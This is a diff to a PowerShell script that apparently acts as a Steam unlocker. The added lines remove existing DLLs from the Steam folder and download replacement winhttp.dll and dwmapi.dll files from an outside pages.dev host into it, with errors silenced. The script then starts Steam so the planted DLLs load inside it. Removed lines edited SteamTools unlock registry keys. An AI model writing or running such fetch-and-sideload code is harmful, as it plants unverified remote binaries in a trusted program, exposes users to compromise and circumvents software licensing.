@@ -59,9 +59,16 @@ if (-not (Test-Path $steamPath -PathType Container)) {
 
 $steamConfigPath = Join-Path $steamPath "config"
 
-$verPath = Join-Path $steamPath "version.dll"
+$veroldPath = Join-Path $steamPath "version.dll"
         
+Remove-ItemIfExists $veroldPath
+
+$verPath = Join-Path $steamPath "winhttp.dll"
 Remove-ItemIfExists $verPath
+
+$DWMPath = Join-Path $steamPath "dwmapi.dll"
+        
+Remove-ItemIfExists $DWMPath
 
 
 function PwStart() {
@@ -89,7 +96,7 @@ function PwStart() {
 
         
 
-        $downloadverDll = "https://zdb1.pages.dev/version.dll"
+        $downloadverDll = "https://zdb1.pages.dev/winhttp.dll"
 
         try {
             Invoke-RestMethod -Uri $downloadverDll -OutFile $verPath -ErrorAction Stop
@@ -99,21 +106,20 @@ function PwStart() {
                 Invoke-RestMethod -Uri $downloadverDll -OutFile $verPath -ErrorAction SilentlyContinue
             }
         }
+        $downloadDWMDll = "https://zdb1.pages.dev/dwmapi.dll"
 
-
-
-        if (!(Test-Path $steamToolsRegPath)) {
-            New-Item -Path $steamToolsRegPath -Force -ErrorAction SilentlyContinue | Out-Null
-        }
-       try {
-            Remove-ItemProperty -Path $steamToolsRegPath -Name "ActivateUnlockMode" -ErrorAction SilentlyContinue
-            Remove-ItemProperty -Path $steamToolsRegPath -Name "AlwaysStayUnlocked" -ErrorAction SilentlyContinue
-            Remove-ItemProperty -Path $steamToolsRegPath -Name "notUnlockDepot" -ErrorAction SilentlyContinue
-            
-            Set-ItemProperty -Path $steamToolsRegPath -Name "iscdkey" -Value "true" -Type String -ErrorAction SilentlyContinue
+        try {
+            Invoke-RestMethod -Uri $downloadDWMDll -OutFile $DWMPath -ErrorAction Stop
         } catch {
-            # Hata çıkarsa hiçbir şey yapma ve ekrana yazma
+            if (Test-Path $DWMPath) {
+                Move-Item -Path $DWMPath -Destination "$DWMPath.old" -Force -ErrorAction SilentlyContinue
+                Invoke-RestMethod -Uri $downloadDWMDll -OutFile $DWMPath -ErrorAction SilentlyContinue
+            }
         }
+
+
+
+
         $steamExePath = Join-Path $steamPath "steam.exe"
         Start-Process $steamExePath
         Start-Process "steam://"
